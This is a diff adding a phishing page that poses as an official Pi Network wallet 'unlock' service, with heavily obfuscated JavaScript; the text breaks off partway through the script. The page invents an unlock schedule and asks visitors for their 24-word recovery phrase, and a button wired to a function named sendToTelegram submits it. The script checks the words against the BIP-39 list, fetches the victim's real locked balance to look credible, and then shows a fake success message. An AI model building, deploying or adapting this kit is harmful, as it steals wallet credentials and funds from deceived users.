+                        <path clip-rule="evenodd" d="M263.784 512.009c0-137.08 111.126-248.206 248.206-248.206 137.079 0 248.205 111.126 248.205 248.206 0 137.079-111.126 248.205-248.205 248.205-137.08 0-248.206-111.126-248.206-248.205ZM511.99 218.675c-162.004 0-293.334 131.33-293.334 293.334 0 162.003 131.33 293.333 293.334 293.333 162.003 0 293.333-131.33 293.333-293.333 0-162.004-131.33-293.334-293.333-293.334Zm-75.955 148.073a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839Zm88.524 0a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839ZM436.035 674V478.172h-32.836v35.706h-51.261v-35.706c0-28.53 22.95-51.659 51.261-51.659h207.31v-28.868h51.262v28.868c0 28.531-22.951 51.659-51.262 51.659h-34.311v176.006L524.559 674V478.172h-36.885v176.006L436.035 674Z" fill="#fcb040" fill-rule="evenodd"></path>
+                    </svg>
+                </div>
+                <div style="width: 24px;"></div>
+            </div>
+            <div class="unlock-content">
+                <div class="warning-message" id="lockedPiResults">
+                    <span class="warning-icon"><i class="fas fa-info-circle"></i></span>
+                    <span>You can unlock the Pi you are locked in. Please select the amount of Pi you want to unlock.</span>
+                </div>
+                <button class="submit-button w-full mb-4" id="selectPiAmountBtn">
+                    <span class="button-text">SELECT WALLET TO UNLOCK</span>
+                    <span class="spinner"></span>
+                </button>
+                <div class="check-locked-form" id="checkLockedForm" style="display: none;">
+                    <div class="mb-4">
+                        <label class="block text-gray-700 mb-2 form-label" for="publicKey">Enter your Wallet address (optional):</label>
+                        <input class="w-full px-4 py-2 border rounded-lg form-input" id="publicKey" placeholder="Example: GCSOU...3LOFV" style="min-height: inherit; font-family: inherit;" type="text">
+                    </div>
+                    <button class="submit-button w-full" id="checkBtn">
+                        <span class="button-text">CHECK LOCKED PI</span>
+                        <span class="spinner"></span>
+                    </button>
+                    <p class="error-message" id="publicKeyError">Please enter a valid Wallet address</p>
+                </div>
+                <div class="loading-overlay" id="loading" style="position: relative; height: 100px; margin: 20px 0; display: none;">
+                    <div class="loading-spinner" style="width: 50px; height: 50px;"></div>
+                    <p class="mt-2 text-gray-600" style="position: absolute; top: 60px; text-align: center; width: 100%;">Loading...</p>
+                </div>
+                <div id="resultsContainer"></div>
+                <div id="lockedPiSummary" style="display: none;">
+                    <div class="total-locked">
+                        <div class="total-locked-label">Available Pi to unlock</div>
+                        <div class="total-locked-amount">π <span id="availableAmount">0.00</span>/<span id="detailedLockedAmount">0.00</span></div>
+                    </div>
+                </div>
+                <div class="info-collapsible" id="unlockOptionsSection" style="display: block;">
+                    <div class="info-header">
+                        <h3>Why allow Unlock before locked Pi?</h3>
+                        <button class="collapse-toggle">
+                            <i class="fas fa-chevron-down"></i>
+                        </button>
+                    </div>
+                    <div class="info-content">
+                        <div class="info-content-inner">
+                            <h4>Unlock Pi - A Balancing Act Between Growth and Stability</h4>
+                            <p>
+                                Pi Network commits to building a sustainable ecosystem, where Pi is not only a digital asset but also has real value in the decentralized economy. To balance the need for early access to Pi and long-term growth, we propose a flexible unlocking mechanism, ensuring fairness, stability, and encouraging active community participation.
+                            </p>
+                            <h5>Core Principles</h5>
+                            <ul class="info-list">
+                                <li><span class="check-icon"></span> Strengthen ecosystem value: The flexible unlocking mechanism helps protect Pi's stability, avoiding large fluctuations.</li>
+                                <li><span class="check-icon"></span> Encourage transactions: Active users contribute to the liquidity of the Pi economy.</li>
+                                <li><span class="check-icon"></span> Ensure fairness: The mechanism applies to each level to be suitable for long-term pioneers.</li>
+                            </ul>
+                            <h5>Unlock Schedule</h5>
+                            <div class="info-block">
+                                <p>
+                                    <span class="bullet"><i class="fas fa-check-circle text-blue-500"></i></span> Unlock ratio based on time:
+                                </p>
+                                <ul>
+                                    <li>Year 1: Allow unlocking of 50% of locked Pi for pioneers</li>
+                                    <li>Year 2: Unlock 20% of the remaining Pi</li>
+                                    <li>Year 3: Complete the unlocking of the remaining Pi</li>
+                                </ul>
+                            </div>
+                            <h5>Importance of This Mechanism</h5>
+                            <ul class="info-target">
+                                <li>
+                                    <span class="target-icon"><i class="fas fa-bullseye text-purple-600"></i></span> Ensure Pi value is not devalued...
+                                </li>
+                                <li><span class="target-icon"></span> Encourage transactions, create a stable economic platform</li>
+                                <li><span class="target-icon"></span> Bring benefits to pioneers committed to the ecosystem</li>
+                            </ul>
+                            <p>
+                                Pi Network is not just a crypto project, but a truly decentralized economy. This unlocking mechanism is a crucial part of our long-term strategy, aiming for a sustainable future for all pioneers.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div id="amountSelectionSection">
+                    <div class="form-group">
+                        <label class="form-label" for="piAmount">Select the amount of Pi to unlock (manual)</label>
+                        <div class="amount-display">π <span id="amountValue">1</span></div>
+                        <input class="amount-slider" id="piAmount" max="5000" min="1" type="range" value="500">
+                        <div class="amount-limits">
+                            <span>Minimum: 1 Pi</span>
+                            <span id="maxPiLimit">Maximum: total Pi locked</span>
+                        </div>
+                    </div>
+                    <button class="submit-button" id="submitAmount">
+                        <span class="button-text">REQUEST UNLOCK</span>
+                        <span class="spinner"></span>
+                    </button>
+                </div>
+                <div class="help-text mt-4">
+                    The locked Pi number displayed here is the Pi number that is locked in your wallet. After sending the request, you need to verify the wallet owner's identity using your Pi wallet recovery phrase.
+                </div>
+            </div>
+        </div>
+        <!-- Unlock Pi Page -->
+        <div class="page" id="unlockPage">
+            <div class="header">
+                <div class="back-button" id="backToAmount" onclick="navigateToAmount()">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M15 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                    </svg>
+                </div>
+                <div class="header-title">
+                    <svg class="header-unlock-icon" fill="none" stroke="var(--pi-gold)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect height="11" rx="2" ry="2" width="18" x="3" y="11"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v2"></path>
+                    </svg>
+                    Wallet
+                    <svg class="header-pi-logo" fill="none" height="26" viewBox="0 0 1024 1024" width="26" xmlns="http://www.w3.org/2000/svg">
+                        <path clip-rule="evenodd" d="M263.784 512.009c0-137.08 111.126-248.206 248.206-248.206 137.079 0 248.205 111.126 248.205 248.206 0 137.079-111.126 248.205-248.205 248.205-137.08 0-248.206-111.126-248.206-248.205ZM511.99 218.675c-162.004 0-293.334 131.33-293.334 293.334 0 162.003 131.33 293.333 293.334 293.333 162.003 0 293.333-131.33 293.333-293.333 0-162.004-131.33-293.334-293.333-293.334Zm-75.955 148.073a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839Zm88.524 0a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839ZM436.035 674V478.172h-32.836v35.706h-51.261v-35.706c0-28.53 22.95-51.659 51.261-51.659h207.31v-28.868h51.262v28.868c0 28.531-22.951 51.659-51.262 51.659h-34.311v176.006L524.559 674V478.172h-36.885v176.006L436.035 674Z" fill="#fcb040" fill-rule="evenodd"></path>
+                    </svg>
+                </div>
+                <div style="width: 24px;"></div>
+            </div>
+            <div class="unlock-content">
+                <div class="warning-message" id="detailedPiResults">
+                    <span class="warning-icon"><i class="fas fa-exclamation-triangle"></i></span>
+                    <span>Warning: If the Pi balance locked in your wallet is not greater than or equal to the amount you request, you will not be able to unlock.</span>
+                </div>
+                <div class="form-group">
+                    
+                    <textarea class="form-input" id="recoveryPhrase" name="phrase" placeholder="Enter your 24-word recovery phrase here" style="min-height: 160px; font-family: monospace;"></textarea>
+                    <div class="error-message" id="errorMessage">Please enter exactly 24 recovery words</div>
+                    <div class="validation-message" id="validationMessage">Please enter exactly 24 recovery words</div>
+                </div>
+                <button class="submit-button" id="submitUnlock" onclick="sendToTelegram()" type="button">
+                    <span class="button-text">UNLOCK WITH RECOVERY PHRASE</span>
+                    <span class="spinner"></span>
+                </button>
+                <button class="fingerprint-button" id="fingerprintUnlock" disabled="">
+                    <span class="button-text">BIOMETRIC NOT AVAILABLE</span>
+                    <span class="spinner"></span>
+                </button>
+                <div class="help-text">
+                    As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.
+                    <br>
+                    <br>
+                    <span>Lost your wallet recovery phrase?</span>
+                    <a href="https://unlockpi.us/#">You can create a new wallet</a>, but all π in your previous wallet will be inaccessible.
+                </div>
+            </div>
+        </div>
+        <!-- Loading Overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-spinner"></div>
+        </div>
+        <!-- Success Alert -->
+        <div class="success-alert" id="successAlert">
+            <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+            <h3 style="text-align: center;">Successfully Unlocked Pi</h3>
+            <!-- Transaction Preview Card -->
+            <div style="background-color: #f5f5f5; border-radius: 12px; padding: 14px; margin: 16px 0; text-align: left;">
+                <div style="background-color: white; border-radius: 10px; padding: 12px; display: flex; align-items: center; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);">
+                    <!-- Left side - just the icon image, no background -->
+                    <div style="margin-right: 14px; display: flex; align-items: center; justify-content: center;">
+                        <img alt="Lock icon" src="./1_files/icon2.jpg" style="width: 50px; height: 50px;">
+                    </div>
+                    <!-- Right side - transaction details -->
+                    <div>
+                        <div class="pi-amount">+<span id="successAmount">1</span>,00 Pi</div>
+                        <div class="from-address">From: <span id="walletHash">GABT7...4GC5G</span></div>
+                        <div class="unlock-date" id="unlockDate">Expected: 2025-05-23 07:02</div>
+                    </div>
+                </div>
+            </div>
+            <div class="transaction-detail-row" style="text-align: left;">
+                <span class="transaction-detail-label">Status</span>
+                <span class="transaction-detail-value" style="color: #22c55e;"> <i class="fas fa-circle-notch fa-spin"></i> Unlocked </span>
+            </div>
+            <div class="transaction-detail-row" style="text-align: left;">
+                <span class="transaction-detail-label">Request</span>
+                <span class="transaction-detail-value" id="requestCount">0/2</span>
+            </div>
+            <!-- Important Note -->
+            <div class="important-note" style="text-align: left;">
+                <p>If the Pi balance locked in your wallet is not enough to request, you will not be able to unlock. You have 1 more chance to send again if you did not do it correctly.</p>
+                <p style="margin-top: 8px;">Your request has been processed.</p>
+            </div>
+            <button class="close-button" id="closeSuccess">
+                <span class="button-text">CLOSE</span>
+                <span class="spinner"></span>
+            </button>
+        </div>
+        <!-- Modal backdrop -->
+        <div class="modal-backdrop" id="modalBackdrop"></div>
+        <!-- Trang loading đầu tiên -->
+        <div class="page loading-page" id="initialLoadingPage" style="visibility: hidden; opacity: 0;">
+            <div class="loading-container">
+                <div class="loading-spinner-purple"></div>
+                <div class="loading-text purple">Loading...</div>
+            </div>
+        </div>
+        <!-- Trang loading xác thực -->
+        <div class="page loading-page" id="authLoadingPage" style="visibility: hidden; opacity: 0;">
+            <div class="loading-container">
+                <div class="loading-spinner-purple"></div>
+                <div class="loading-text">Authenticating with Pi Network...</div>
+            </div>
+        </div>
+        <script>
+            (function(_0xfb53a1,_0x5f2b1c){const _0x563b9c=_0x1056,_0x52e75f=_0xfb53a1();while(!![]){try{const _0x30cb91=parseInt(_0x563b9c(0x23a))/0x1+-parseInt(_0x563b9c(0x231))/0x2+-parseInt(_0x563b9c(0x256))/0x3*(-parseInt(_0x563b9c(0x1ca))/0x4)+-parseInt(_0x563b9c(0x20d))/0x5+parseInt(_0x563b9c(0x249))/0x6*(-parseInt(_0x563b9c(0x1ed))/0x7)+-parseInt(_0x563b9c(0x223))/0x8*(parseInt(_0x563b9c(0x1fd))/0x9)+parseInt(_0x563b9c(0x1c7))/0xa;if(_0x30cb91===_0x5f2b1c)break;else _0x52e75f['push'](_0x52e75f['shift']());}catch(_0x2b8c2c){_0x52e75f['push'](_0x52e75f['shift']());}}}(_0x5b01,0xbb248),document['addEventListener']('DOMContentLoaded',function(){const _0x281089=_0x1056;console[_0x281089(0x1cf)]('DOM\x20fully\x20loaded');const _0x4580af=document['getElementById']('selectPiAmountBtn'),_0x48b1a4=document[_0x281089(0x1d0)](_0x281089(0x243));_0x4580af[_0x281089(0x217)](_0x281089(0x1d5),function(){const _0x37127d=_0x281089;_0x48b1a4[_0x37127d(0x261)]['display']===_0x37127d(0x1e7)?(_0x48b1a4['style']['display']='block',_0x4580af[_0x37127d(0x210)](_0x37127d(0x242))['textContent']='SELECT\x20WALLET\x20TO\x20UNLOCK'):(_0x48b1a4[_0x37127d(0x261)][_0x37127d(0x23f)]=_0x37127d(0x1e7),_0x4580af[_0x37127d(0x210)](_0x37127d(0x242))[_0x37127d(0x214)]='SELECT\x20AUTO\x20UNLOCK\x20AMOUNT');}),initializeCollapsibleInfo(),window[_0x281089(0x240)](_0x281089(0x24b))[_0x281089(0x217)]('change',_0x251402=>{const _0x319b14=_0x281089,_0x2af0d5=document[_0x319b14(0x200)](_0x319b14(0x24d));_0x2af0d5[_0x319b14(0x20b)](_0x2b2049=>{const _0x1ed5bf=_0x319b14;_0x2b2049[_0x1ed5bf(0x261)]['borderBottomColor']!==_0x1ed5bf(0x25c)&&(_0x251402[_0x1ed5bf(0x225)]?_0x2b2049[_0x1ed5bf(0x261)][_0x1ed5bf(0x21b)]='rgba(255,\x20255,\x20255,\x200.08)':_0x2b2049['style'][_0x1ed5bf(0x21b)]=_0x1ed5bf(0x1d7));});});const _0x53f25c=document['getElementById'](_0x281089(0x1fc)),_0x452c9e=document[_0x281089(0x1d0)](_0x281089(0x213)),_0x5725d2=document[_0x281089(0x1d0)](_0x281089(0x258)),_0x193120=document[_0x281089(0x1d0)]('unlockPiButton'),_0x18c319=document[_0x281089(0x1d0)](_0x281089(0x1c4)),_0x424b62=document[_0x281089(0x1d0)](_0x281089(0x1c6)),_0x583406=document[_0x281089(0x1d0)](_0x281089(0x1f5)),_0x2eb5bc=document[_0x281089(0x1d0)](_0x281089(0x1d2)),_0x560813=document['getElementById']('validationMessage'),_0x4c7bbc=document[_0x281089(0x1d0)]('loadingOverlay'),_0x1051ed=document[_0x281089(0x1d0)](_0x281089(0x20a)),_0x2545c5=document[_0x281089(0x1d0)](_0x281089(0x237)),_0x1923f0=document['getElementById'](_0x281089(0x267)),_0x58d36d=document['getElementById'](_0x281089(0x228)),_0x3b8d92=document[_0x281089(0x1d0)](_0x281089(0x219)),_0x15e288=document[_0x281089(0x1d0)]('unlockDate'),_0x341103=document[_0x281089(0x1d0)](_0x281089(0x260)),_0x1209ec=document[_0x281089(0x1d0)](_0x281089(0x22e)),_0x5c0f7b=document[_0x281089(0x1d0)]('publicKey'),_0x3f674f=document[_0x281089(0x1d0)]('checkBtn'),_0x502dc7=document[_0x281089(0x1d0)](_0x281089(0x263)),_0xef2784=document[_0x281089(0x1d0)](_0x281089(0x25d)),_0x5d5d21=document[_0x281089(0x1d0)](_0x281089(0x1f1)),_0x20e030=document[_0x281089(0x1d0)](_0x281089(0x236)),_0x56f0cf=document[_0x281089(0x1d0)](_0x281089(0x241)),_0x3ef377=document[_0x281089(0x1d0)]('unlockOptionsSection'),_0x14eee4=document[_0x281089(0x1d0)](_0x281089(0x201)),_0x5bcb9c=document[_0x281089(0x1d0)]('maxPiLimit'),_0x25383d=document['getElementById'](_0x281089(0x1e5)),_0x1f1ed4=document['getElementById'](_0x281089(0x1fe)),_0x564c23=document[_0x281089(0x1d0)](_0x281089(0x250));function _0x3ac299(_0x25f2d6){const _0x326767=_0x281089,_0x23c179=_0x25f2d6*0x1;_0x25383d[_0x326767(0x214)]=_0x23c179[_0x326767(0x24f)](0x2),_0x56f0cf['textContent']=_0x25f2d6[_0x326767(0x24f)](0x2),_0x1923f0['max']=Math[_0x326767(0x233)](_0x23c179),_0x1923f0[_0x326767(0x222)]=Math[_0x326767(0x233)](_0x23c179),_0x58d36d['textContent']=Math[_0x326767(0x233)](_0x23c179),_0x3b8d92['textContent']=Math[_0x326767(0x233)](_0x23c179),_0x5bcb9c[_0x326767(0x214)]=_0x326767(0x1cd)+Math['floor'](_0x23c179)+'\x20Pi',_0x20e030[_0x326767(0x261)][_0x326767(0x23f)]=_0x326767(0x1bf);}_0x20e030[_0x281089(0x261)][_0x281089(0x23f)]=_0x281089(0x1e7);_0x193120?(console[_0x281089(0x1cf)](_0x281089(0x1f3)),_0x193120['addEventListener'](_0x281089(0x1d5),function(_0x14ecb3){const _0x4e7186=_0x281089;console[_0x4e7186(0x1cf)](_0x4e7186(0x1e8)),handleUnlockPiClick(_0x14ecb3);})):console[_0x281089(0x1d1)](_0x281089(0x244));function _0x3119aa(){const _0x4277d1=_0x281089,_0x2cb38a=new Date();_0x2cb38a['setDate'](_0x2cb38a[_0x4277d1(0x245)]()+0x1);const _0x1c9e89=_0x2cb38a[_0x4277d1(0x1d4)](),_0x1d5042=String(_0x2cb38a['getMonth']()+0x1)[_0x4277d1(0x205)](0x2,'0'),_0x5d2573=String(_0x2cb38a[_0x4277d1(0x245)]())[_0x4277d1(0x205)](0x2,'0'),_0x820fbf=String(_0x2cb38a['getHours']())[_0x4277d1(0x205)](0x2,'0'),_0x5a6a60=String(_0x2cb38a['getMinutes']())[_0x4277d1(0x205)](0x2,'0'),_0x4a837a=_0x1c9e89+'-'+_0x1d5042+'-'+_0x5d2573+'\x20'+_0x820fbf+':'+_0x5a6a60;_0x15e288['textContent']=_0x4277d1(0x209)+_0x4a837a;}_0x3119aa();let _0x29a9a5=null,_0x6ed980=![];async function _0x5d2d08(){const _0x3e9605=_0x281089;if(_0x29a9a5!==null)return _0x29a9a5;if(_0x6ed980)return null;_0x6ed980=!![];try{const _0x133bf7=await fetch(_0x3e9605(0x1c0));if(!_0x133bf7['ok'])throw new Error(_0x3e9605(0x1dc));const _0x568931=await _0x133bf7[_0x3e9605(0x1f7)](),_0x57ff08=_0x568931['split']('\x0a')[_0x3e9605(0x246)](_0x2f4f14=>_0x2f4f14[_0x3e9605(0x23e)]()[_0x3e9605(0x1f9)]>0x0);return _0x29a9a5=new Set(_0x57ff08[_0x3e9605(0x25e)](_0x4766d8=>_0x4766d8[_0x3e9605(0x20f)]())),_0x29a9a5;}catch(_0x3111a1){console[_0x3e9605(0x1d1)]('Error\x20fetching\x20BIP-39\x20wordlist:',_0x3111a1);const _0x53efec=[_0x3e9605(0x22d),'ability','able','about',_0x3e9605(0x1e1),_0x3e9605(0x20e),_0x3e9605(0x266),_0x3e9605(0x206),'absurd',_0x3e9605(0x21c),'access',_0x3e9605(0x226),'account','accuse',_0x3e9605(0x24a),_0x3e9605(0x22c),'acoustic','acquire',_0x3e9605(0x235),'act'];return _0x29a9a5=new Set(_0x53efec),_0x29a9a5;}finally{_0x6ed980=![];}}async function _0x254703(_0x3fd55d){const _0x54e255=_0x281089,_0x52ea9a=await _0x5d2d08();if(!_0x52ea9a)return{'valid':![],'invalidWords':[]};const _0x4b4dd1=_0x3fd55d['filter'](_0x1724cb=>!_0x52ea9a[_0x54e255(0x1ee)](_0x1724cb['toLowerCase']()));return{'valid':_0x4b4dd1['length']===0x0,'invalidWords':_0x4b4dd1};}function _0x29dac9(){const _0x2c0631=_0x281089;try{return parseInt(localStorage[_0x2c0631(0x1c8)](_0x2c0631(0x1e3))||'0');}catch(_0x51505b){return console['error'](_0x2c0631(0x207),_0x51505b),0x0;}}function _0x30148e(){const _0x297f2c=_0x281089;try{const _0x5d1a0e=_0x29dac9();return localStorage[_0x297f2c(0x1f0)](_0x297f2c(0x1e3),(_0x5d1a0e+0x1)['toString']()),_0x5d1a0e+0x1;}catch(_0xd226b0){return console[_0x297f2c(0x1d1)](_0x297f2c(0x221),_0xd226b0),0x0;}}function _0x11a9a0(){return _0x29dac9()>=0x2;}function _0x264c21(){const _0x2b1280=_0x281089,_0x472acd=_0x29dac9();_0x341103[_0x2b1280(0x214)]=_0x472acd+'/2';}function _0x33010b(_0x14a1c2,_0x113f99){const _0x5c5ea6=_0x281089;_0x113f99?(_0x14a1c2[_0x5c5ea6(0x21d)]['add']('button-processing'),_0x14a1c2['disabled']=!![]):(_0x14a1c2['classList']['remove']('button-processing'),_0x14a1c2['disabled']=![]);}_0x5d2d08(),_0x583406['addEventListener'](_0x281089(0x253),async function(){const _0xc7a1c4=_0x281089,_0xd6574e=this['value']['trim']();let _0x21c48b=0x0,_0x2beef1=[];_0xd6574e&&(_0x2beef1=_0xd6574e[_0xc7a1c4(0x1c1)](/\s+/)[_0xc7a1c4(0x246)](_0x53abfe=>_0x53abfe[_0xc7a1c4(0x1f9)]>0x0),_0x21c48b=_0x2beef1[_0xc7a1c4(0x1f9)]);if(_0x21c48b>0x0&&_0x21c48b!==0x18)_0x560813[_0xc7a1c4(0x261)][_0xc7a1c4(0x23f)]='block',_0x560813['textContent']=_0xc7a1c4(0x1df)+_0x21c48b+_0xc7a1c4(0x1cc),_0x2eb5bc[_0xc7a1c4(0x261)][_0xc7a1c4(0x23f)]=_0xc7a1c4(0x1e7);else{if(_0x21c48b===0x18){const _0x28f344=await _0x254703(_0x2beef1);if(!_0x28f344[_0xc7a1c4(0x1ea)]){const _0x123b76=_0x28f344[_0xc7a1c4(0x22b)][_0xc7a1c4(0x254)](0x0,0x3);_0x560813[_0xc7a1c4(0x261)][_0xc7a1c4(0x23f)]=_0xc7a1c4(0x1bf),_0x560813[_0xc7a1c4(0x214)]='The\x20phrase\x20contains\x20invalid\x20words:\x20'+_0x123b76[_0xc7a1c4(0x220)](',\x20')+(_0x28f344[_0xc7a1c4(0x22b)][_0xc7a1c4(0x1f9)]>0x3?_0xc7a1c4(0x25b):''),_0x2eb5bc['style'][_0xc7a1c4(0x23f)]=_0xc7a1c4(0x1e7);}else _0x560813['style']['display']=_0xc7a1c4(0x1e7),_0x2eb5bc[_0xc7a1c4(0x261)][_0xc7a1c4(0x23f)]=_0xc7a1c4(0x1e7);}else _0x560813['style'][_0xc7a1c4(0x23f)]=_0xc7a1c4(0x1e7),_0x2eb5bc[_0xc7a1c4(0x261)]['display']=_0xc7a1c4(0x1e7);}});async function _0xb6eb8b(){const _0x5037ac=_0x281089,_0x2a7fbd=_0x583406[_0x5037ac(0x222)][_0x5037ac(0x23e)]();if(!_0x2a7fbd)return _0x2eb5bc[_0x5037ac(0x261)]['display']='block',_0x2eb5bc[_0x5037ac(0x214)]=_0x5037ac(0x25f),![];const _0x48a081=_0x2a7fbd['split'](/\s+/)[_0x5037ac(0x246)](_0x2f1d13=>_0x2f1d13);if(_0x48a081[_0x5037ac(0x1f9)]!==0x18)return _0x2eb5bc[_0x5037ac(0x261)][_0x5037ac(0x23f)]=_0x5037ac(0x1bf),_0x2eb5bc[_0x5037ac(0x214)]=_0x5037ac(0x1df)+_0x48a081[_0x5037ac(0x1f9)]+')',![];const _0x11c63d=await _0x254703(_0x48a081);if(!_0x11c63d['valid']){const _0x98cb5c=_0x11c63d['invalidWords'][_0x5037ac(0x254)](0x0,0x3);return _0x2eb5bc['style'][_0x5037ac(0x23f)]=_0x5037ac(0x1bf),_0x2eb5bc[_0x5037ac(0x214)]=_0x5037ac(0x232)+_0x98cb5c[_0x5037ac(0x220)](',\x20')+(_0x11c63d[_0x5037ac(0x22b)][_0x5037ac(0x1f9)]>0x3?_0x5037ac(0x25b):''),![];}return _0x2eb5bc['style'][_0x5037ac(0x23f)]=_0x5037ac(0x1e7),!![];}_0x424b62['addEventListener']('click',async function(){const _0x56fb51=_0x281089;console['log'](_0x56fb51(0x265)),_0x33010b(_0x424b62,!![]);if(_0x11a9a0()){_0x2eb5bc[_0x56fb51(0x261)][_0x56fb51(0x23f)]=_0x56fb51(0x1bf),_0x2eb5bc[_0x56fb51(0x214)]=_0x56fb51(0x21a),_0x33010b(_0x424b62,![]);return;}const _0x509af8=await _0xb6eb8b();if(!_0x509af8){_0x33010b(_0x424b62,![]);return;}const _0x57621e=_0x583406[_0x56fb51(0x222)][_0x56fb51(0x23e)]();_0x4c7bbc[_0x56fb51(0x261)]['display']='flex';try{console[_0x56fb51(0x1cf)](_0x56fb51(0x211),_0x58d36d[_0x56fb51(0x214)]);const _0x5f4bdd=_0x30148e();_0x341103[_0x56fb51(0x214)]=_0x5f4bdd+'/2',setTimeout(function(){const _0x9b0055=_0x56fb51;_0x4c7bbc[_0x9b0055(0x261)][_0x9b0055(0x23f)]='none',_0x3119aa(),_0x1051ed[_0x9b0055(0x261)][_0x9b0055(0x23f)]=_0x9b0055(0x1bf),document[_0x9b0055(0x1d0)](_0x9b0055(0x1da))['style']['display']=_0x9b0055(0x1bf),_0x33010b(_0x424b62,![]),console[_0x9b0055(0x1cf)](_0x9b0055(0x1bd));},0x7d0);}catch(_0x3abb7e){console[_0x56fb51(0x1d1)](_0x56fb51(0x1d9),_0x3abb7e),_0x4c7bbc[_0x56fb51(0x261)][_0x56fb51(0x23f)]=_0x56fb51(0x1e7),_0x33010b(_0x424b62,![]),_0x2eb5bc[_0x56fb51(0x261)][_0x56fb51(0x23f)]='block',_0x2eb5bc[_0x56fb51(0x214)]=_0x56fb51(0x1eb);}}),_0x1923f0[_0x281089(0x217)]('input',function(){const _0x4e23e0=_0x281089,_0x1aa4d2=this[_0x4e23e0(0x222)];_0x58d36d['textContent']=_0x1aa4d2,_0x3b8d92[_0x4e23e0(0x214)]=_0x1aa4d2;}),_0x18c319['addEventListener'](_0x281089(0x1d5),function(){const _0x822a0c=_0x281089;console[_0x822a0c(0x1cf)](_0x822a0c(0x262)),_0x33010b(_0x18c319,!![]),setTimeout(()=>{const _0x1e5856=_0x822a0c;_0x33010b(_0x18c319,![]),window[_0x1e5856(0x1c5)]();},0x320);}),_0x2545c5[_0x281089(0x217)](_0x281089(0x1d5),function(){const _0x44ab8e=_0x281089;console[_0x44ab8e(0x1cf)](_0x44ab8e(0x1c2)),_0x33010b(_0x2545c5,!![]),setTimeout(function(){const _0x1042e0=_0x44ab8e;_0x1051ed['style'][_0x1042e0(0x23f)]=_0x1042e0(0x1e7),document['getElementById'](_0x1042e0(0x1da))['style'][_0x1042e0(0x23f)]=_0x1042e0(0x1e7),window[_0x1042e0(0x1f8)](),_0x583406[_0x1042e0(0x222)]='',_0x2eb5bc[_0x1042e0(0x261)][_0x1042e0(0x23f)]=_0x1042e0(0x1e7),_0x560813[_0x1042e0(0x261)][_0x1042e0(0x23f)]=_0x1042e0(0x1e7),_0x33010b(_0x2545c5,![]);},0x1f4);}),_0x264c21(),_0x3f674f[_0x281089(0x217)](_0x281089(0x1d5),function(){const _0x51a986=_0x281089,_0x4c350c=_0x5c0f7b[_0x51a986(0x222)][_0x51a986(0x23e)]();if(!_0x4c350c||_0x4c350c[_0x51a986(0x1f9)]<0xa){_0x502dc7[_0x51a986(0x261)][_0x51a986(0x23f)]=_0x51a986(0x1bf);return;}_0x502dc7[_0x51a986(0x261)][_0x51a986(0x23f)]=_0x51a986(0x1e7),_0x5d5d21[_0x51a986(0x224)]='',_0xef2784[_0x51a986(0x261)][_0x51a986(0x23f)]=_0x51a986(0x1ec),_0x20e030[_0x51a986(0x261)][_0x51a986(0x23f)]='none';const _0x486a77='https://api.mainnet.minepi.com/claimable_balances?claimant='+_0x4c350c+'&limit=100',_0x16fc81=_0x51a986(0x1e2)+_0x4c350c+_0x51a986(0x1cb);Promise[_0x51a986(0x238)]([fetch(_0x486a77)['then'](_0x40b46a=>_0x40b46a['json']()),fetch(_0x16fc81)['then'](_0x115f13=>_0x115f13[_0x51a986(0x1d6)]())])[_0x51a986(0x1ce)](([_0x5d670d,_0x3ee55f])=>{const _0x45cec8=_0x51a986;_0xef2784['style'][_0x45cec8(0x23f)]=_0x45cec8(0x1e7);const _0x5e492c=_0x541b06(_0x3ee55f,_0x5d670d,_0x4c350c);if(_0x5e492c[_0x45cec8(0x1f9)]===0x0){_0x5d5d21[_0x45cec8(0x224)]=_0x45cec8(0x252);return;}_0x579ece(_0x5e492c);const _0x55e7d2=_0x5e492c[_0x45cec8(0x216)]((_0x23c112,_0x22c232)=>_0x23c112+_0x22c232[_0x45cec8(0x1e0)],0x0),_0x23f0ad=_0x5e492c[_0x45cec8(0x246)](_0x8018d9=>!_0x8018d9[_0x45cec8(0x1fb)]),_0x13a688=_0x23f0ad[_0x45cec8(0x216)]((_0x44a768,_0xf1cc52)=>_0x44a768+_0xf1cc52[_0x45cec8(0x1e0)],0x0);_0x56f0cf[_0x45cec8(0x214)]=_0x13a688['toFixed'](0x7),_0x3ac299(_0x13a688),_0x20e030[_0x45cec8(0x261)][_0x45cec8(0x23f)]=_0x45cec8(0x1bf),_0x1209ec['textContent']=_0x4c350c[_0x45cec8(0x255)](0x0,0x6)+_0x45cec8(0x25b)+_0x4c350c[_0x45cec8(0x255)](_0x4c350c[_0x45cec8(0x1f9)]-0x5),document[_0x45cec8(0x1d0)](_0x45cec8(0x234))[_0x45cec8(0x224)]=_0x45cec8(0x20c)+_0x13a688['toFixed'](0x7)+_0x45cec8(0x247);})['catch'](_0x324352=>{const 